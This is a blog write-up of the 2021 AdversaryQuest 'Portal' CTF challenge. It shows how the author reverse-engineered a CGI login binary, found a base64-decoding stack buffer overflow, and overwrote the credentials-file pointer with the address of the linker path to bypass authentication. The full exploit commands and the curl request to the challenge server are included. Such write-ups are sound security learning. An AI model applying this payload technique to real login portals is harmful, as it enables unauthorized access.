<!doctype html><html lang=en-us>
<head>
<meta charset=utf-8>
<meta name=viewport content="width=device-width,initial-scale=1">
<meta http-equiv=x-ua-compatible content="ie=edge">
<meta itemprop=name content="Portal">
<meta itemprop=description content="Challenge Description:  PROTECTIVE PENGUIN gained access to one of their victims through the victim&rsquo;s extranet authentication portals and we were asked to investigate.
  Please download the Portal Code and see whether you can reproduce their means of initial access vector. We stood up a test instance of the authentication portal for you to validate against.
 Write-Up: This challenge had an interesting authentication bypass via a buffer overflow."><meta itemprop=datePublished content="2021-01-30T19:50:00-06:00">
<meta itemprop=dateModified content="2021-01-30T19:50:00-06:00">
<meta itemprop=wordCount content="1070">
<meta itemprop=keywords content="AdversaryQuest,CTFs,"><meta property="og:title" content="Portal">
<meta property="og:description" content="Challenge Description:  PROTECTIVE PENGUIN gained access to one of their victims through the victim&rsquo;s extranet authentication portals and we were asked to investigate.
  Please download the Portal Code and see whether you can reproduce their means of initial access vector. We stood up a test instance of the authentication portal for you to validate against.
 Write-Up: This challenge had an interesting authentication bypass via a buffer overflow.">
<meta property="og:type" content="article">
<meta property="og:url" content="https://lothan.github.io/ctfs/2021-adversary-quest/portal/"><meta property="article:section" content="ctfs">
<meta property="article:published_time" content="2021-01-30T19:50:00-06:00">
<meta property="article:modified_time" content="2021-01-30T19:50:00-06:00">
<meta name=twitter:card content="summary">
<meta name=twitter:title content="Portal">
<meta name=twitter:description content="Challenge Description:  PROTECTIVE PENGUIN gained access to one of their victims through the victim&rsquo;s extranet authentication portals and we were asked to investigate.
  Please download the Portal Code and see whether you can reproduce their means of initial access vector. We stood up a test instance of the authentication portal for you to validate against.
 Write-Up: This challenge had an interesting authentication bypass via a buffer overflow.">
<link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png>
<link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png>
<link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png>
<link rel=manifest href=/site.webmanifest>
<link rel=mask-icon href=/safari-pinned-tab.svg color>
<link rel="shortcut icon" href=/favicon.ico>
<title>Portal</title>
<link rel=stylesheet href=https://lothan.github.io/css/style.min.eac77496566fd7d5768fd650ddb0b2b181ca6a2d7c5fdd6fe6b8ba4bf47e566f.css integrity="sha256-6sd0llZv19V2j9ZQ3bCysYHKai18X91v5ri6S/R+Vm8=" crossorigin=anonymous>
</head>
<body id=page>
<header id=site-header class="animated slideInUp">
<div class="hdr-wrapper section-inner">
<div class=hdr-left>
<div class=site-branding>
<a href=https://lothan.github.io/>Joe Lothan</a>
</div>
<nav class="site-nav hide-in-mobile">
<a href=https://lothan.github.io/ctfs/>CTFs</a>
</nav>
</div>
<div class="hdr-right hdr-icons">
<span class="hdr-social hide-in-mobile"><a href=https://github.com/lothan target=_blank rel="noopener me" title=Github><svg xmlns="http://www.w3.org/2000/svg" class="feather" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37.0 00-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44.0 0020 4.77 5.07 5.07.0 0019.91 1S18.73.65 16 2.48a13.38 13.38.0 00-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07.0 005 4.77 5.44 5.44.0 003.5 8.55c0 5.42 3.3 6.61 6.44 7A3.37 3.37.0 009 18.13V22"/></svg></a></span><button id=menu-btn class=hdr-btn title=Menu><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-menu"><line x1="3" y1="12" x2="21" y2="12"/><line x1="3" y1="6" x2="21" y2="6"/><line x1="3" y1="18" x2="21" y2="18"/></svg></button>
</div>
</div>
</header>
<div id=mobile-menu class="animated fast">
<ul>
<li><a href=https://lothan.github.io/ctfs/>CTFs</a></li>
</ul>
</div>
<main class="site-main section-inner thin animated fadeIn faster">
<h1>Portal</h1>
<div class=content>
<h4 id=challenge-description>Challenge Description:<a href=#challenge-description class=anchor aria-hidden=true><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 015 5 5 5 0 01-5 5h-3m-6 0H6a5 5 0 01-5-5 5 5 0 015-5h3"/><line x1="8" y1="12" x2="16" y2="12"/></svg></a></h4>
<blockquote>
<p>PROTECTIVE PENGUIN gained access to one of their victims through the victim&rsquo;s extranet authentication portals and we were asked to investigate.</p>
</blockquote>
<blockquote>
<p>Please download the Portal Code and see whether you can reproduce their means of initial access vector. We stood up a test instance of the authentication portal for you to validate against.</p>
</blockquote>
<h4 id=write-up>Write-Up:<a href=#write-up class=anchor aria-hidden=true><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 015 5 5 5 0 01-5 5h-3m-6 0H6a5 5 0 01-5-5 5 5 0 015-5h3"/><line x1="8" y1="12" x2="16" y2="12"/></svg></a></h4>
<p>This challenge had an interesting authentication bypass via a buffer overflow. Let&rsquo;s take a look.</p>
<p>We&rsquo;re given the code to the victim&rsquo;s authentication portal. By running it, logging in, and inspecting the request we can see that it sends a POST request to <code>portal.cgi</code>. The payload of the request is our username and password base64ed and in JSON format.</p>
<p><img src=images/penguin-auth-portal.png alt="an example request to the penguin auth portal"></p>
<p><code>portal.cgi</code> is a <a href=https://en.wikipedia.org/wiki/Common_Gateway_Interface>CGI binary</a> that can be run directly via the command line. All we have to do is send the POST datat to standard input and pass the correct environment variables.</p>
<pre tabindex=0><code>$ echo '{&quot;user&quot;:&quot;dXNlcm5hbWU=&quot;,&quot;pass&quot;:&quot;cGFzc3dvcmQ=&quot;}' | \
       REQUEST_METHOD=POST CONTENT_LENGTH=45 ./cgi-bin/portal.cgi
Content-Type: application/json

{&quot;status&quot;: &quot;err&quot;}                                   
</code></pre><p>If we pass it a correct username and password stored in the creds.txt file, we can log in:</p>
<pre tabindex=0><code>$ echo '{&quot;user&quot;:&quot;YWRtaW4=&quot;,&quot;pass&quot;:&quot;YWRtaW4=&quot;}' | \
       REQUEST_METHOD=POST CONTENT_LENGTH=38 ./cgi-bin/portal.cgi
Content-Type: application/json

{&quot;status&quot;: &quot;success&quot;, &quot;flag&quot;: &quot;(null)&quot;}
</code></pre><p>Opening <code>portal.cgi</code> in a reverse engineering program (I&rsquo;m using Cutter here), we can decompile it and see how it actually authenticates. In <code>main</code> it checks environment variables for <code>REQUEST_METHOD</code> and <code>CONTENT_LENGTH</code> then it reads in the correct amount of bytes from standard input:</p>
<p><img src=images/penguin-portal-main-start.png alt="first part of the portal&rsquo;s main function"></p>
<p>Next it parses the json, looking for <code>"user"</code> and <code>"pass"</code>. Then it passes the base64 encoded username and password to <code>fcn.00401226</code>, the main authenticator function. If it returns <code>0</code>, then the authentication is successful and it returns the flag.</p>
<p><img src=images/penguin-portal-main-parse.png alt="second part of the portal&rsquo;s main function"></p>
<p>Let&rsquo;s take a look at this authenticator function. First it zeros out a buffer, then it <a href=https://www.lemoda.net/unix/base64/index.html>uses <code>__b64_pton</code> to decode the base64</a> and copy it into the buffer. It does this twice, adding the character <code>:</code> (<code>0x3a</code>) in between the username and password.</p>
<p><img src=images/penguin-portal-auth-b64.png alt="first part of the auth function"></p>
<p>Then it opens up the file name specified, <code>creds.txt</code>, runs through each line looking for a <code>:</code> character using <code>strchr</code>, and finally uses <code>strcmp</code> to compare the buffer created above with the line in <code>creds.txt</code>. If <code>strcmp</code> returns 0 and the line in <code>creds.txt</code> is the same as the username/password combo passed to the authenticator function, then it returns 0 and authentication succeeds.</p>
<p><img src=images/penguin-portal-auth-strcmp.png alt="second part of the auth function"></p>
<p>You can see the decompiler is getting confused at many points but it also points us in the direction of an exploit. The base64 decoder makes no checks to see if it overruns the buffer it is copying into - it gives a whopping <code>0x100</code> bytes to work with, much larger than the buffer size. We can send a very large payload and overrun the buffer.</p>
<pre tabindex=0><code>$ cat bigbuff.json 
{&quot;user&quot;:&quot;QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBCg==&quot;,&quot;pass&quot;:&quot;QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBCg==&quot;}
$ wc bigbuff.json 
  1   1 526 bigbuff.json
$ cat bigbuff.json | REQUEST_METHOD=POST CONTENT_LENGTH=525 ./cgi-bin/portal.cgi
Content-Type: application/json

*** stack smashing detected ***: terminated
</code></pre><p>Ah but there is stack smashing detection enabled, so we cannot change the return address of the authenticator function, we can only change the contents <em>within</em> the stack. Luckily the filename that normally points to <code>"creds.txt"</code> is directly after this buffer. So if we overflow the buffer to point to a filename we already know, we can pass a correct username and password pair. Let&rsquo;s take a look in gdb, set the correct environment variables, and set a breakpoint right before the second call to <code>__b64_pton</code>.</p>
<pre tabindex=0><code>$ gdb -q ./cgi-bin/portal.cgi 
Reading symbols from ./cgi-bin/portal.cgi...
(No debugging symbols found in ./cgi-bin/portal.cgi)
(gdb) set environment REQUEST_METHOD=POST
(gdb) set environment CONTENT_LENGTH=525
(gdb) break *0x401307
Breakpoint 1 at 0x401307
(gdb) r &lt; bigbuff.json 
</code></pre><p>The call to <code>fopen</code> takes the filename pointer from <code>-0x18(%rbp)</code>, which is initally points to <code>creds.txt</code>. After overwriting the buffer, the pointer is <code>0x414141...</code> or <code>AAA...</code> our long username and password in <code>bigbuff.json</code>.</p>
<p><img src=images/penguin-portal-gdb-overflow.png alt="gdb stepping over the buffer overflow"></p>
<p>At the top, the first call to <code>__b64_pton</code> copies the output to <code>%rbp - 0x220 + 0x104</code> or <code>%rbp - 0x11c</code>. The filename pointer is at <code>%rbp - 0x18</code> so our buffer is <code>0x11c - 0x18</code>, or 260 bytes long. So including the <code>:</code> added in between the username and password, we can construct a payload that overwrites the filename pointer but doesn&rsquo;t smash the stack:</p>
<pre tabindex=0><code>$ python -c 'print(&quot;A&quot;*130, end=&quot;&quot;)' &gt; user
$ python -c 'print(&quot;B&quot;*129+&quot;CDEF&quot;, end=&quot;&quot;)' &gt; pass
$ echo -n '{&quot;user&quot;:&quot;'$(base64 -w 0 user)'&quot;,&quot;pass&quot;:&quot;'$(base64 -w 0 pass)'&quot;}' \
       &gt; test.json
$ wc -c test.json
377 test.json
$ gdb -q ./cgi-bin/portal.cgi 
Reading symbols from ./cgi-bin/portal.cgi...
(No debugging symbols found in ./cgi-bin/portal.cgi)
(gdb) set environment REQUEST_METHOD=POST
(gdb) set environment CONTENT_LENGTH=377
(gdb) break *0x401307
Breakpoint 1 at 0x401307
(gdb) r &lt; test.json 
</code></pre><p><img src=images/penguin-portal-find-buffer-length.png alt="testing to see if we can overwrite the buffer"></p>
<p>But now that we can change this finename pointer, we have the problem of what exactly we should change it <em>to</em>. At first I thought we can change it to <code>index.html</code>, a file we know exists on the machine and has semicolons in it, and thus, according to the authentication program, <code>username:password</code> pairs.</p>
<p>But we are changing a filename <em>pointer</em> so we need to have the text <code>index.html</code> loaded in memory, accessable, <em>and</em> know/control the address to it. We can add <code>index.html</code> to our payload or pass it as an environment variable (it&rsquo;s a cgi-bin so we have some control over the environment). But there would be no way to point to it - ASLR is enabled and a 64 bit binary so the exact location of our input is unknownable.</p>
<p>With ASLR enabled, the only place with fixed memory addresses is in the binary itself. Looking through the binary for strings that are pathnames, we only have only one other, aside from <code>creds.txt</code>:</p>
<p><img src=images/penguin-portal-path-to-file.png alt="looking for strings"></p>
<p>Aha! <code>/lib64/ld-linux-x86-64.so.2</code>, the path to the program&rsquo;s dynamic linker. If we change the filename point to look for credentials to that file instead, we can send it a <code>username:password</code> combination that is already in <code>/lib64/ld-linux-x86-64.so.2</code>. It is a binary file and we don&rsquo;t have the exact copy to inspect, but it probably isn&rsquo;t too different from one on another modern linux machine.</p>
<p>I looked in my own linker and tried a few different lines that had a <code>:</code> in it and the line <code>runtime linker statistics:</code> finally worked. Thankfullly we send our payload in base64 so we can null terminate our string while still overflowing the buffer. Finishing up:</p>
<pre tabindex=0><code>$ echo -n &quot;runtime linker statistics&quot; &gt; user
$ python -c 'payload = b&quot;\x00&quot; + b&quot;A&quot;*(260-27) + b&quot;\xa8\x02\x40\x00&quot;;\
  	 open(&quot;pass&quot;, &quot;wb&quot;).write(payload)'
$ echo -n '{&quot;user&quot;:&quot;'$(base64 -w 0 user)'&quot;,&quot;pass&quot;:&quot;'$(base64 -w 0 pass)'&quot;}' &gt; payload.json
$ curl -d @payload.json https://authportal.challenges.adversary.zone:8880/cgi-bin/portal.cgi
{&quot;status&quot;: &quot;success&quot;, &quot;flag&quot;: &quot;CS{w3b_vPn_h4xx}&quot;}
</code></pre>
</div>
</main>
<footer id=site-footer class="section-inner thin animated fadeIn faster">
<p>&copy; 2021 <a href=https://lothan.github.io/>Joe Lothan</a></p>
<p>
Made with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a> &#183; Theme <a href=https://github.com/Track3/hermit target=_blank rel=noopener>Hermit</a> &#183; <a href=https://lothan.github.io/posts/index.xml target=_blank title=rss><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 019 9"/><path d="M4 4a16 16 0 0116 16"/><circle cx="5" cy="19" r="1"/></svg></a>
</p>
</footer>
<script src=https://lothan.github.io/js/bundle.min.7d8545daa55d62427355498dd8da13f98ff79a7938ce7d2a5e2ae1ec0de3beb8.js integrity="sha256-fYVF2qVdYkJzVUmN2NoT+Y/3mnk4zn0qXirh7A3jvrg=" crossorigin=anonymous></script>
</body>
</html>